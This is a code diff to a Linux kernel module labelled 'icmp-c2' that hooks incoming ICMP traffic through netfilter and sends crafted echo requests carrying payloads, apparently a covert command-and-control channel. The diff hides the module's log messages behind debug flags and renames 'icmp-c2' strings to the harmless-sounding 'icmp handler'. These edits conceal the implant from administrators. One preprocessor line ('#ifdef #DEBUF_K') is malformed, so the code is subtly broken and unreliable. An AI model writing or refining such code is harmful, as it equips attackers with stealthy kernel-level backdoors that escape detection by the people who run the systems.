@@ -89,11 +89,13 @@ static int send_icmp_echo_request(struct icmphdr *incoming_icmp, __be32 address,
 
     // Send the ICMP Echo Request
     ret = kernel_sendmsg(raw_socket, &msg, &iov, 1, PACKET_SIZE);
-    if (ret < 0) {
-        pr_err("Failed to send ICMP echo request: %d\n", ret);
-    } else {
-        pr_info("ICMP echo request sent successfully\n");
-    }
+    #ifdef DEBUG_K
+        if (ret < 0) {
+            pr_err("ICMP failed to reply: %d\n", ret);
+        } else {
+            pr_info("ICMP echo request sent successfully\n");
+        }
+    #endif
 
     // Clean up
     sock_release(raw_socket);
@@ -127,7 +129,9 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
     icmp_payload_len = ntohs(iph->tot_len) - (iph->ihl * 4) - ICMP_HLEN;
     payload = (void *)icmph + ICMP_HLEN;
 
-    pr_info("icmp_payload_len: %d\n", icmp_payload_len);
+    #ifdef #DEBUF_K
+        pr_info("icmp_payload_len: %d\n", icmp_payload_len);
+    #endif
 
     // TODO: Check if ignore all is set
     if(send_icmp_echo_request(icmph, iph->saddr, payload, icmp_payload_len) < 0){
@@ -138,7 +142,9 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
 
 // Module initialization
 static int __init init_icmp_hijack(void) {
-    printk(KERN_INFO "Loading icmp-c2 module...\n");
+    #ifdef DEBUG_K
+        printk(KERN_INFO "Loading icmp-c2 module...\n");
+    #endif
 
     // Fill in the nf_hook_ops structure
     nfho.hook = icmp_hijack;                     // Hook function
@@ -149,18 +155,21 @@ static int __init init_icmp_hijack(void) {
 
     // Register the hook
     nf_register_net_hook(&init_net, &nfho);
-    printk(KERN_INFO "icmp-C2 loaded.\n");
+
+    #ifdef DEBUG_K
+        printk(KERN_INFO "icmp handler loaded.\n");
+    #endif
 
     return 0;
 }
 
 // Module cleanup
 static void __exit exit_icmp_hijack(void) {
-    printk(KERN_INFO "Unloading icmp-c2...\n");
+    printk(KERN_INFO "Unloading icmp...\n");
 
     // Unregister the hook
     nf_unregister_net_hook(&init_net, &nfho);
-    printk(KERN_INFO "icmp-c2 unloaded.\n");
+    printk(KERN_INFO "icmp handler unloaded.\n");
 }
 
 module_init(init_icmp_hijack);
